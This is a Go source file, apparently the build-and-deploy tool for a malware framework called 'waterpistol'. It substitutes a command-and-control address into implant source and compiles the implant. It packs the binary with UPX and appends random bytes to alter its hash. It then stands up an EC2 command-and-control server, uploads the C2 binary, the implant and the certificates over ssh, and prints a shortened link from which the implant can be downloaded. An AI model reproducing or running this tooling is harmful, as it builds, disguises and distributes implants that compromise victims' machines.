package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func checkError(err error) {
	if err != nil {
		panic(err)
	}
}

func (project *project) preprocess_file(data []byte) []byte {
	sdata := string(data)

	// Replace imports
	sdata = strings.Replace(sdata, "malware/", project.srcid+"/", -1)

	sdata = strings.Replace(sdata, "_C2_IP_", project.ip, -1)
	sdata = strings.Replace(sdata, "_C2_PORT_", strconv.Itoa(project.port), -1)

	modules_create := ""
	modules_import := ""
	for _, module := range project.modules {
		modules_create += module + ".Create(),\n"
		modules_import += "\"" + project.srcid + "/implant/modules/" + module + "\"\n"
	}
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_IMPORT_", modules_import, -1)
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_", modules_create, -1)

	return []byte(sdata)
}

func (project *project) visit(path string, f os.FileInfo, err error) error {
	newpath := project.srcdir + "/" + path
	if f.IsDir() {
		os.MkdirAll(newpath, os.ModePerm)
	} else {
		input, err := ioutil.ReadFile(path)
		if err != nil {
			return err
		}

		data := project.preprocess_file(input)

		err = ioutil.WriteFile(newpath, data, 0644)
		return err
	}

	return nil
}

func (project *project) compile(program string, use_goos_arch bool) (string, error) {
	tmpfile, err := ioutil.TempFile("", "*.bin")
	if err != nil {
		return "", err
	}

	var cmd *exec.Cmd

	if use_goos_arch {
		cmd = exec.Command("env", "GOOS="+project.GOOS, "GOARCH="+project.GOARCH, "go", "build", "-o", tmpfile.Name(), "-ldflags", "-s -w", program)
	} else {
		cmd = exec.Command("env", "GOOS=linux", "GOARCH=amd64", "go", "build", "-o", tmpfile.Name(), "-ldflags", "-s -w", program)
	}

	out, err := cmd.CombinedOutput()

	if err != nil {
		log.Println(string(out))
		return "", err
	}

	out, err = exec.Command("upx", tmpfile.Name()).CombinedOutput()

	if err != nil {
		log.Println(string(out))
		return "", err
	}

	return tmpfile.Name(), nil
}

// Gen ssh keys + ec2 ip
func (project *project) generate_c2_ip() (string, string) {
	cmd := exec.Command("bash", "./c2_up")

	log.Println("Bringing up c2 infra")
	ip, err := cmd.Output()

	if ip == nil {
		log.Println("Got null IP, err: %s", err)
		return "", ""
	}
	log.Println("C2 up on ", string(ip), " Waiting 15 seconds for c2 to boot...")
	time.Sleep(15 * time.Second)
	return strings.TrimSpace(string(ip)), "./id_c2"
}

func (project *project) uploadC2(c2 string, implant string, priv_key string) error {
	cmd := exec.Command("bash", "-c", "scp -i "+priv_key+" -o \"StrictHostKeyChecking no\" "+c2+" ec2-user@"+project.ip+":~/c2")

	log.Print("Uploading c2...")
	if out, err := cmd.CombinedOutput(); err != nil {
		log.Println(string(out))
		return err
	}

	fmt.Println("Done")

	// Upload implant
	log.Print("Uploading hosting implant.sh...")
	cmd = exec.Command("bash", "-c", "scp -i "+priv_key+" -o \"StrictHostKeyChecking no\" hosting_implant.sh ec2-user@"+project.ip+":~/hosting_implant.sh")
	if err := cmd.Run(); err != nil {
		return err
	}
	fmt.Println("Done")

	cmd = exec.Command("ssh", "-o", "StrictHostKeyChecking no", "-i", "./id_c2", "-t", "ec2-user@"+project.ip, "./hosting_implant.sh")
	if out, err := cmd.CombinedOutput(); err != nil {
		fmt.Println(string(out))
		return err
	}

	log.Print("Uploading implant...")
	cmd = exec.Command("bash", "-c", "scp -i "+priv_key+" -o \"StrictHostKeyChecking no\" "+implant+" ec2-user@"+project.ip+":~/implant/"+project.name)

	if out, err := cmd.CombinedOutput(); err != nil {
		log.Println(string(out))
		return err
	}
	fmt.Println("Done")

	// Uploading certs
	cmd = exec.Command("bash", "-c", "scp -i "+priv_key+" -o \"StrictHostKeyChecking no\" "+project.srcdir+"/cert.pem ec2-user@"+project.ip+":~/cert.pem")
	if err := cmd.Run(); err != nil {
		return err
	}

	cmd = exec.Command("bash", "-c", "scp -i "+priv_key+" -o \"StrictHostKeyChecking no\" "+project.srcdir+"/key.pem ec2-user@"+project.ip+":~/key.pem")
	if err := cmd.Run(); err != nil {
		return err
	}
	log.Println("Crts uploaded")

	log.Println("Binary implant: ", shorten("http://"+project.ip+":8080/"+project.name))
	return nil
}

func (project *project) compile_c2_implant() {
	// Generate cert/key
	// Generate IP for c2
	// Copy source to /tmp dir
	// Preprocess %keys%, %options%
	// build and copy binaries somewhere
	// Upload and run c2 binary

	// Create temp dir
	tmpdir, err := ioutil.TempDir(os.Getenv("GOPATH"), "src/waterpistol")
	id := strings.Split(tmpdir, "src/")[1]

	checkError(err)

	log.Println("Tmp dir created", tmpdir)
	defer os.RemoveAll(tmpdir)

	project.srcdir = tmpdir
	project.srcid = id

	// Genereate ec2
	c2_ip, c2_priv_key_file := project.generate_c2_ip()
	if c2_ip == "" {
		panic("Got empty c2 ip, spinup failed")
	}

	project.ip = c2_ip
	project.port = rand.Intn(65535) + 1 // Port between 5->35000

	// Copy source for implant and c2
	checkError(filepath.Walk("implant", project.visit))
	checkError(filepath.Walk("c2", project.visit))
	checkError(filepath.Walk("common", project.visit))

	log.Println("Source copied")

	GenCerts(project.srcdir)
	log.Println("Certs generated")

	implant, err := project.compile(id+"/implant", true)
	checkError(err)
	log.Println("Binary implant: ", implant)

	out, err := exec.Command("bash", "-c", "head /dev/urandom >> "+implant).CombinedOutput()

	if err != nil {
		fmt.Println(out)
		panic(err)
	}

	c2, err := project.compile(id+"/c2", false)
	checkError(err)
	log.Println("Binary c2: ", c2)

	checkError(project.uploadC2(c2, implant, c2_priv_key_file))
}
